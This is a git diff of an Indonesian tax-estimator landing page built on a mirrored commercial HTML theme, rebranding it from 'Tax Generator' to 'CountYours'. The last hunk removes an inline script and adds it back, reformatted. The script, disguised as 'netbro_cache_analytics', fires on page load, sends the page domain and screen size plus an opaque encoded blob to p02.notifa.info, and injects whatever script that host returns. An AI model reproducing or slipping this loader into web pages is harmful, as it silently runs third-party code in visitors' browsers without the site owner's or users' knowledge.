@@ -3,12 +3,13 @@
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:53:46 GMT -->
+
 <head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
-    <title>Tax Generator</title>
+    <title>CountYours</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="vendors/bootstrap-selector/css/bootstrap-select.min.css">
@@ -47,11 +48,11 @@
 
                     <div class="collapse navbar-collapse" id="navbarSupportedContent">
                         <ul class="navbar-nav menu w_menu ml-auto">
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                             </li>
                             </li>
                         </ul>
@@ -64,7 +65,7 @@
         <section class="payment_banner_area_two">
             <div class="container">
                 <div class="payment_content_two text-center">
-                    <h2>The next generation <br>of <span>Tax Generator</span></h2>
+                    <h2>The next generation <br>of <span>CountYours</span></h2>
                     <div class="action_btn d-flex align-items-center justify-content-center">
                         <a href="/register" class="slider_btn btn_hover"><i class="ti-plus"></i>Join Us</a>
                         <a href="/register" class="video_btn">Silahkan Daftar & Login<br>untuk menggunakan tools Gratis dari kami</a>
@@ -92,7 +93,7 @@
         <section class="payment_features_two sec_pad">
             <div class="container">
                 <div class="sec_title text-center mb_70 wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
-                    <h2 class="f_p f_size_30 l_height50 f_700 t_color">TAX GENERATOR</h2>
+                    <h2 class="f_p f_size_30 l_height50 f_700 t_color">CountYours</h2>
                     <p class="f_400 f_size_18 l_height34">Adalah sebuat tools gratis yang bisa kamu gunakan<br>untuk membantu kamu dalam hal memprediksi Jumlah Pajak Yang Harus kamu Bayarkan</p>
                     <img src="img/ch3.png">
                 </div>
@@ -100,7 +101,7 @@
                     <div class="col-lg-3 col-sm-6">
                         <div class="payment_features_item text-center">
                             <img src="img/new/icon8.png" alt="">
-                            <h4>Tax Generator</h4>
+                            <h4>CountYours</h4>
                             <p>Website kami mampu untuk membuat perkiraan jumlah pajak yang harus anda bayarkan berdasarkan data yang anda input.<br><br></p>
                         </div>
                     </div>
@@ -108,7 +109,7 @@
                         <div class="payment_features_item text-center">
                             <img src="img/new/icon7.png" alt="">
                             <h4>Responsive</h4>
-                            <p>Tax Generator merupakan website yang bisa digunakan semua perangkat yang anda miliki, karena website ini sangat responsive.</p>
+                            <p>CountYours merupakan website yang bisa digunakan semua perangkat yang anda miliki, karena website ini sangat responsive.</p>
                         </div>
                     </div>
                     <div class="col-lg-3 col-sm-6">
@@ -133,7 +134,7 @@
                 <div class="row">
                     <div class="col-lg-7 d-flex align-items-center">
                         <div class="payment_features_content_two">
-                            <h2 class="t_color">Tax Generator</h2>
+                            <h2 class="t_color">CountYours</h2>
                             <p>Pengguna dapat menentukan besaran pajak yang harus ia bayarkan. Dalam laman aplikasi, pengguna memilih beberapa pilihan sebelum memasukan data yang mana sesuai dengan kondisi pengguna. Data yang diminta berupa data finansial pribadi yang tak akan digunakan untuk keperluan lain. Data akan diproses dengan perhitungan yang transparan dan akan menampilkan hasil berupa estimasi dana pajak yang harus ia bayarkan.</p>
                             <div class="row">
                                 <div class="col-lg-6 col-md-6">
@@ -188,7 +189,9 @@
                         <div class="col-lg-4 col-sm-6">
                             <div class="f_widget company_widget">
                                 <a href="/home" class="f-logo"><img src="img/bigtaxlogo.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
-                                <p class="mt_40">Tax Generator adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br><h6 style="color:white;">Copyright © 2020 TaxGenerator.com</h6></p>
+                                <p class="mt_40">CountYours adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br>
+                                <h6 style="color:white;">Copyright © 2022 CountYours.com</h6>
+                                </p>
                             </div>
                         </div>
                         <div class="col-lg-3 col-sm-6">
@@ -205,10 +208,8 @@
                             <div class="f_widget about-widget">
                                 <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Developer</h3>
                                 <ul class="list-unstyled f_list">
-                                    <li><a href="#">Faris Izzatur Rahman</a></li>
-                                    <li><a href="#">Hafad Furqani</a></li>
-                                    <li><a href="#">M. Rizki Riswandi</a></li>
-                                    <li><a href="#">Rico Halim</a></li>
+                                    <li><a href="#">Farrah Fahira Murzani</a></li>
+                                    <li><a href="#">Stefhani Alba Siregar</a></li>
                                 </ul>
                             </div>
                         </div>
@@ -245,8 +246,35 @@
     <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
+</body>
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:54:12 GMT -->
+
 </html>
